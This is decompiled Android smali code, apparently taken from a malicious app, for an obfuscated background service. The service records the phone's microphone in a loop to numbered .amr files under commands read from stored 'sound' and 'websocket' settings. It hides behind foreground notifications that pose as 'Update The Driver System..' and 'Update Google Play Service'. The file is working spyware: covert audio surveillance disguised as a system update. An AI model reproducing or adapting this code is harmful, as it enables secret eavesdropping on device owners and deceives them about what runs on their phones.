.class public Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;
.super Landroid/app/IntentService;


# instance fields
.field a:Ljava/lang/String;

.field b:Z

.field c:Lwocwvy/czyxoxmbauu/slsa/b;

.field d:Landroid/content/Context;

.field private e:Landroid/app/Notification;


# direct methods
.method public constructor <init>()V
    .locals 1

    const-string v0, "cpysnikhf"

    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    const-string v0, ""

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->a:Ljava/lang/String;

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/b;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->c:Lwocwvy/czyxoxmbauu/slsa/b;

    return-void
.end method

.method private a()V
    .locals 2
    .annotation build Landroid/annotation/TargetApi;
        value = 0x10
    .end annotation

    new-instance v0, Landroid/app/Notification$Builder;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->d:Landroid/content/Context;

    invoke-direct {v0, v1}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;)V

    const-string v1, "Info"

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    const-string v1, "Update The Driver System.."

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    const/high16 v1, 0x7f020000

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object v0

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->e:Landroid/app/Notification;

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->e:Landroid/app/Notification;

    const/16 v1, 0x26b2

    invoke-virtual {p0, v1, v0}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->startForeground(ILandroid/app/Notification;)V

    return-void
.end method


# virtual methods
.method a(Landroid/content/Context;Ljava/lang/String;I)V
    .locals 9

    new-instance v6, Landroid/media/MediaRecorder;

    invoke-direct {v6}, Landroid/media/MediaRecorder;-><init>()V

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->c:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v1, "SOUND"

    const-string v2, "START RECORD SOUND"

    invoke-virtual {v0, v1, v2}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->b:Z

    const/4 v0, 0x1

    invoke-virtual {v6, v0}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    const/4 v1, 0x3

    invoke-virtual {v6, v1}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    invoke-virtual {v6, v0}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    invoke-virtual {v6, p2}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V

    new-instance v7, Ljava/lang/Thread;

    new-instance v8, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;

    move-object v0, v8

    move-object v1, p0

    move v2, p3

    move-object v3, v6

    move-object v4, p2

    move-object v5, p1

    invoke-direct/range {v0 .. v5}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;-><init>(Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;ILandroid/media/MediaRecorder;Ljava/lang/String;Landroid/content/Context;)V

    invoke-direct {v7, v8}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    :try_start_0
    invoke-virtual {v6}, Landroid/media/MediaRecorder;->prepare()V

    invoke-virtual {v6}, Landroid/media/MediaRecorder;->start()V

    invoke-virtual {v7}, Ljava/lang/Thread;->start()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method protected onHandleIntent(Landroid/content/Intent;)V
    .locals 6

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->c:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v1, "Start"

    const-string v2, "cpysnikhf"

    invoke-virtual {v0, v1, v2}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iput-object p0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->d:Landroid/content/Context;

    const/4 v0, 0x1

    iput-boolean v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->b:Z

    const-string v0, "str"

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "foreground"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_0

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->c:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "Google"

    const-string v1, "Update Google Play Service"

    invoke-static {p0, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/app/Service;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    :cond_0
    invoke-direct {p0}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->a()V

    :cond_1
    :goto_0
    const/4 v0, 0x0

    :goto_1
    const/4 v1, 0x0

    :cond_2
    :goto_2
    iget-boolean v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->b:Z

    if-eqz v2, :cond_2

    new-instance v2, Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-direct {v2}, Lwocwvy/czyxoxmbauu/slsa/b;-><init>()V

    const-string v3, "sound"

    invoke-virtual {v2, p0, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "stop"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_4

    const-string v3, "websocket"

    invoke-virtual {v2, p0, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_3

    goto :goto_3

    :cond_3
    :try_start_0
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v4, 0x0

    invoke-virtual {p0, v4}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->getExternalFilesDir(Ljava/lang/String;)Ljava/io/File;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v4, "/"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    iput-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->a:Ljava/lang/String;

    const-string v3, "+"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, ""

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v5, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->a:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, ".amr"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->d:Landroid/content/Context;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v5, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->a:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, ".amr"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x3

    invoke-virtual {p0, v3, v4, v5}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->a(Landroid/content/Context;Ljava/lang/String;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v1, v1, 0x1

    const/16 v2, 0xa

    if-lt v1, v2, :cond_2

    goto :goto_1

    :catch_0
    const-string v3, "RecordSound"

    const-string v4, "ERROR!"

    invoke-virtual {v2, v3, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_2

    :cond_4
    :goto_3
    invoke-virtual {p0, p1}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->stopService(Landroid/content/Intent;)Z

    return-void
.end method
